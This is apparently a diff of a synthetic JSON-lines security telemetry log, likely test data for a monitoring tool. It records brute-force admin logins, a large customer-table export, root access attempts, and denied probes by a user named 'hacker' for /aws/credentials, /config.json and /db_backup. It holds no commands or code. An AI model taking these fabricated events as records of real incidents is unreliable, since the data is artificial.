@@ -1,56 +1,132 @@
-{"timestamp": "2026-03-06T05:45:22.575388Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:22.677070Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:22.778327Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:22.879532Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:22.981598Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.065803Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.082313Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.117565Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.168344Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.183762Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.219347Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.270341Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.285068Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.322011Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.373990Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.386982Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.425829Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.478732Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.488692Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.529879Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.567780Z", "component": "TELEMETRY", "event_type": "data_export", "user": "employee_5", "size_mb": 1500, "table": "customers", "ip": "172.16.0.5"}
-{"timestamp": "2026-03-06T05:45:23.581299Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.590580Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.632098Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.683466Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.691543Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.734305Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.786197Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.836958Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.888973Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:23.941181Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.002021Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.053562Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.069087Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
-{"timestamp": "2026-03-06T05:45:24.105621Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.156978Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.209022Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.259760Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.311437Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.363634Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.421711Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.476016Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.530132Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.569266Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/admin", "ip": "192.168.1.55", "status_code": 403}
-{"timestamp": "2026-03-06T05:45:24.570811Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
-{"timestamp": "2026-03-06T05:45:24.581915Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.633399Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.684213Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.735147Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.772003Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/aws/credentials", "ip": "192.168.1.55", "status_code": 403}
-{"timestamp": "2026-03-06T05:45:24.786596Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.838601Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
-{"timestamp": "2026-03-06T05:45:24.974452Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/config.json", "ip": "192.168.1.55", "status_code": 403}
-{"timestamp": "2026-03-06T05:45:25.072633Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
-{"timestamp": "2026-03-06T05:45:25.176148Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/db_backup", "ip": "192.168.1.55", "status_code": 403}
-{"timestamp": "2026-03-06T05:45:25.573366Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
+{"timestamp": "2026-03-06T06:29:21.834288Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:21.935464Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.036628Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.137535Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.238712Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.335129Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.339874Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.387267Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.438741Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.441038Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.491216Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.542536Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.543132Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.594703Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.645329Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.646453Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.698625Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.746509Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.750049Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.802110Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.837053Z", "component": "TELEMETRY", "event_type": "data_export", "user": "employee_5", "size_mb": 1500, "table": "customers", "ip": "172.16.0.5"}
+{"timestamp": "2026-03-06T06:29:22.854205Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.848818Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.910855Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.961251Z", "component": "TELEMETRY", "event_type": "login_attempt", "username": "admin", "status": "failed", "ip": "192.168.1.100", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:22.963828Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.015236Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.066946Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.118388Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.170081Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.221012Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.271901Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.323139Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.338460Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
+{"timestamp": "2026-03-06T06:29:23.374286Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.425550Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.476844Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.528025Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.579950Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.631119Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.684060Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.735745Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.787325Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.838838Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.840545Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/admin", "ip": "192.168.1.55", "status_code": 403}
+{"timestamp": "2026-03-06T06:29:23.841063Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
+{"timestamp": "2026-03-06T06:29:23.891826Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.943874Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:23.995443Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:24.042627Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/aws/credentials", "ip": "192.168.1.55", "status_code": 403}
+{"timestamp": "2026-03-06T06:29:24.047103Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:24.098482Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "status_code": 200, "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:29:24.243982Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/config.json", "ip": "192.168.1.55", "status_code": 403}
+{"timestamp": "2026-03-06T06:29:24.343642Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
+{"timestamp": "2026-03-06T06:29:24.445502Z", "component": "TELEMETRY", "event_type": "unauthorized_access", "user": "hacker", "path": "/db_backup", "ip": "192.168.1.55", "status_code": 403}
+{"timestamp": "2026-03-06T06:29:24.844656Z", "component": "TELEMETRY", "event_type": "root_access_attempt", "user": "www-data", "process": "/bin/bash", "ip": "10.1.1.50"}
+{"timestamp": "2026-03-06T06:31:13.657332Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:15.910306Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:18.197028Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:20.368354Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:22.561112Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:23.464983Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_0", "status": "success"}
+{"timestamp": "2026-03-06T06:31:24.734997Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:25.583473Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_1", "status": "success"}
+{"timestamp": "2026-03-06T06:31:26.921189Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:27.668776Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_2", "status": "success"}
+{"timestamp": "2026-03-06T06:31:29.100776Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:29.754722Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_3", "status": "success"}
+{"timestamp": "2026-03-06T06:31:31.291014Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:31.838709Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_4", "status": "success"}
+{"timestamp": "2026-03-06T06:31:33.486687Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:33.919840Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_5", "status": "success"}
+{"timestamp": "2026-03-06T06:31:35.664118Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:35.992538Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_6", "status": "success"}
+{"timestamp": "2026-03-06T06:31:37.860241Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:38.096237Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_7", "status": "success"}
+{"timestamp": "2026-03-06T06:31:40.026748Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:40.197234Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_8", "status": "success"}
+{"timestamp": "2026-03-06T06:31:42.202012Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:42.302887Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_9", "status": "success"}
+{"timestamp": "2026-03-06T06:31:44.393915Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:44.420404Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_10", "status": "success"}
+{"timestamp": "2026-03-06T06:31:46.496099Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_11", "status": "success"}
+{"timestamp": "2026-03-06T06:31:46.558847Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:48.582236Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_12", "status": "success"}
+{"timestamp": "2026-03-06T06:31:48.740525Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:50.652120Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_13", "status": "success"}
+{"timestamp": "2026-03-06T06:31:50.932271Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:52.755616Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_14", "status": "success"}
+{"timestamp": "2026-03-06T06:31:53.111716Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "success", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:54.842126Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_15", "status": "success"}
+{"timestamp": "2026-03-06T06:31:55.279138Z", "component": "TELEMETRY", "event_type": "login_attempt", "ip": "192.168.1.100", "endpoint": "/login", "username": "admin", "status": "failure", "user_agent": "python-requests/2.31.0"}
+{"timestamp": "2026-03-06T06:31:56.942859Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_16", "status": "success"}
+{"timestamp": "2026-03-06T06:31:59.029276Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_17", "status": "success"}
+{"timestamp": "2026-03-06T06:32:01.121289Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_18", "status": "success"}
+{"timestamp": "2026-03-06T06:32:03.228888Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_19", "status": "success"}
